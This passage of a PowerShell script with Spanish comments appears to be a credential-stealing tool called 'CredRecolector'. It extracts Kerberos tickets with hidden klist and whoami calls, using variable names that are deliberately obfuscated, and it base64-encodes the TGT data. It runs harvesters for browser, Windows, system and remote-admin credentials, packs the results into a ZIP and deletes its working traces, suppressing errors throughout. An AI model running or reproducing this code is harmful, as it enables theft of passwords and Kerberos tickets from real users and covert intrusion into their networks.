    "Archivos omitidos (demasiado grandes): $($stats.ArchivosSaltados)" | Out-File -FilePath $statsFile -Append
    "Archivos con credenciales: $($stats.ArchivosConCredenciales)" | Out-File -FilePath $statsFile -Append
    "Total de credenciales encontradas: $($stats.TotalCredencialesEncontradas)" | Out-File -FilePath $statsFile -Append
    
    # Punto crítico: Asegurar que la carpeta se marque correctamente
    if ($stats.ArchivosConCredenciales -gt 0 -or $stats.TotalCredencialesEncontradas -gt 0) {
        # Explícitamente marcar la carpeta como con contenido
        Mark-FolderHasContent -FolderKey $folderKey
        return $true
    } else {
        # Asegurar que hay al menos un archivo para que se incluya en el ZIP
        "No se encontraron credenciales en ningún archivo." | Out-File -FilePath $resultsFile -Append
        Mark-FolderHasContent -FolderKey $folderKey  # Marcar de todos modos para incluir los logs
        return $false
    }
}

# 8. EXTRACCIÓN DE TICKETS KERBEROS
function Get-KerberosTickets {
    # Configuración de carpetas
    $kerberosDir = Join-Path $pRes_v "TicketsKerberos"
    $folderKey = "TicketsKerberos"
    
    # Crear estructura
    Ensure-Folder -FolderPath $kerberosDir -FolderKey $folderKey
    $resultsFile = Join-Path $kerberosDir "tickets_info.txt"
    
    # Escribir encabezado en archivo de resultados
    "# INFORMACION DE TICKETS KERBEROS`r`n" | Out-File -FilePath $resultsFile -Force
    "Extraccion iniciada: $(Get-Date)`r`n" | Out-File -FilePath $resultsFile -Append
    
    try {
        # Definir nombres de archivos temporales ofuscados
        $F1zX = Join-Path $kerberosDir "dt1.txt"
        $d6Pq = Join-Path $kerberosDir "kd.bin"
        $x7Ht = Join-Path $kerberosDir "sn.dat"
        $e5Cv = Join-Path $kerberosDir "ex.dat"
        $infoFile = Join-Path $kerberosDir "info.txt"
        
        # Comando y parámetros ofuscados
        $oN2r = "cmd.exe"
        $L5p8 = "klist"
        
        # Ejecutar comandos con manejo de errores - sintaxis corregida
        $null = Start-Process -FilePath $oN2r -ArgumentList "/c $L5p8 > `"$F1zX`"" -WindowStyle Hidden -Wait
        $null = Start-Process -FilePath $oN2r -ArgumentList "/c $L5p8 tgt > `"$d6Pq`"" -WindowStyle Hidden -Wait
        $null = Start-Process -FilePath $oN2r -ArgumentList "/c set USERDOMAIN `& whoami > `"$x7Ht`"" -WindowStyle Hidden -Wait
        
        # Verificar si los archivos existen antes de leerlos
        $a1Dt = ""
        $k3Bn = ""
        $s6Mn = ""
        
        if (Test-Path $F1zX) { $a1Dt = Get-Content $F1zX -Raw -ErrorAction SilentlyContinue }
        if (Test-Path $d6Pq) { $k3Bn = Get-Content $d6Pq -Raw -ErrorAction SilentlyContinue }
        if (Test-Path $x7Ht) { $s6Mn = Get-Content $x7Ht -Raw -ErrorAction SilentlyContinue }
        
        # Procesar y codificar información
        if (-not [string]::IsNullOrEmpty($k3Bn)) {
            $i2Fu = [System.Text.Encoding]::UTF8.GetBytes($k3Bn)
            $t9Qw = [Convert]::ToBase64String($i2Fu)
            $t9Qw | Set-Content -Path $e5Cv -ErrorAction SilentlyContinue
        }
        
        # Extraer información relevante
        $v1Rz = ""
        if (-not [string]::IsNullOrEmpty($s6Mn)) {
            $v1Rz += "# Usuario y Dominio: " + ($s6Mn -replace "\s+", " ") + "`r`n"
        }
        
        if (-not [string]::IsNullOrEmpty($a1Dt)) {
            # Buscar líneas con TGT y extraer info relevante
            $tgtInfo = $a1Dt -split "`r`n" | Where-Object { $_ -match "TGT|krbtgt" } | Select-Object -First 3
            if ($tgtInfo) {
                $v1Rz += "# Tickets Kerberos encontrados: `r`n"
                foreach ($line in $tgtInfo) {
                    $v1Rz += "  $line`r`n"
                }
            }
        }
        
        # Guardar información procesada
        if (-not [string]::IsNullOrEmpty($v1Rz)) {
            $v1Rz | Out-File $infoFile -Force -ErrorAction SilentlyContinue
            $v1Rz | Out-File $resultsFile -Append -ErrorAction SilentlyContinue
            
            # Agregar información completa de tickets
            if (-not [string]::IsNullOrEmpty($a1Dt)) {
                "# Lista completa de tickets:`r`n" | Out-File $resultsFile -Append
                $a1Dt | Out-File $resultsFile -Append
            }
            
            # Marca la carpeta como con contenido
            Mark-FolderHasContent -FolderKey $folderKey
            "Extraccion completada exitosamente" | Out-File -FilePath $resultsFile -Append
        }
        
        # Limpiar archivos temporales innecesarios
        $filesToRemove = @($F1zX, $d6Pq, $x7Ht)
        foreach ($file in $filesToRemove) {
            if (Test-Path $file) {
                Remove-Item $file -Force -ErrorAction SilentlyContinue
            }
        }
        
        return $true
    }
    catch {
        # Manejo silencioso de errores
        "Error durante la extraccion: $($_.Exception.Message)" | Out-File -FilePath $resultsFile -Append -ErrorAction SilentlyContinue
        return $false
    }
}

# EJECUTAR TODAS LAS FUNCIONES
Write-LogX "Iniciando recolección de navegadores"
Get-BrowserCredentials

Write-LogX "Iniciando recolección de credenciales de Windows"
Get-WindowsCredentials

Write-LogX "Iniciando recolección de herramientas de administración remota"
Get-RemoteAdminTools

Write-LogX "Iniciando búsqueda de archivos de configuración"
Get-ConfigFiles

Write-LogX "Iniciando recolección de credenciales del sistema Windows"
Get-WindowsSystemCredentials

Write-LogX "Verificando configuración adicional"
Get-SysConf

# Ejecutar nueva función de búsqueda de credenciales
Write-LogX "Iniciando búsqueda de credenciales en archivos"
Find-CredentialFiles

# Ejecutar nueva función de extracción de tickets Kerberos
Write-LogX "Extrayendo tickets Kerberos"
Get-KerberosTickets


# LIMPIAR CARPETAS VACÍAS
Write-LogX "Limpiando carpetas vacías"
foreach ($folderKey in $createdFolders.Keys) {
    $folderInfo = $createdFolders[$folderKey]
    if ($folderInfo.Created -and -not $folderInfo.HasFiles) {
        try {
            Remove-Item -Path $folderInfo.Path -Recurse -Force -ErrorAction SilentlyContinue
            Write-LogX "Carpeta vacía eliminada: $($folderInfo.Path)"
        } catch {}
    }
}

# COMPRIMIR RESULTADOS
$time = Get-Date -Format "yyyyMMdd_HHmmss"
$zipFile = "$bDir_z\CredRecolector_$time.zip"
Write-LogX "Comprimiendo resultados en $zipFile"

try {
    # Verificar si hay archivos para comprimir
    $anyFiles = Get-ChildItem -Path $pRes_v -Recurse -File -ErrorAction SilentlyContinue
    
    if ($anyFiles -and $anyFiles.Count -gt 0) {
        # Usar enfoque nativo de PowerShell para comprimir
        try {
            Compress-Archive -Path "$pRes_v\*" -DestinationPath $zipFile -Force -ErrorAction Stop
        } catch {
            # Si falla, intentar con .NET directamente
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::CreateFromDirectory($pRes_v, $zipFile)
            } catch {
                Write-LogX "Error en la compresion, intentando método alternativo"
                # Último intento con Start-Process
                Start-Process -FilePath "powershell" -ArgumentList "-Command `"Add-Type -A 'System.IO.Compression.FileSystem';[IO.Compression.ZipFile]::CreateFromDirectory('$pRes_v','$zipFile')`"" -Wait -WindowStyle Hidden
            }
        }
        
        # Verificar si se creó correctamente
        if (Test-Path -Path $zipFile) {
            Write-LogX "Compresion completada exitosamente"
        } else {
            Write-LogX "No se pudo crear el archivo ZIP"
        }
    } else {
        Write-LogX "No se encontraron archivos para comprimir"
    }
} catch {
    Write-LogX "Error general en la compresion"
}

# LIMPIAR DIRECTORIO TEMPORAL
try {
    Start-Sleep -Seconds 2
    if (Test-Path -Path $zipFile) {
        Remove-Item -Path $pRes_v -Recurse -Force -ErrorAction SilentlyContinue
    }
} catch {}

# Mensaje final solo si se encontraron archivos
if ($foundFiles) {
    Write-Host "Proceso completado. Resultados guardados en: $zipFile" -ForegroundColor Green
} else {
    Write-Host "Proceso completado. No se encontro informacion relevante." -ForegroundColor Yellow
}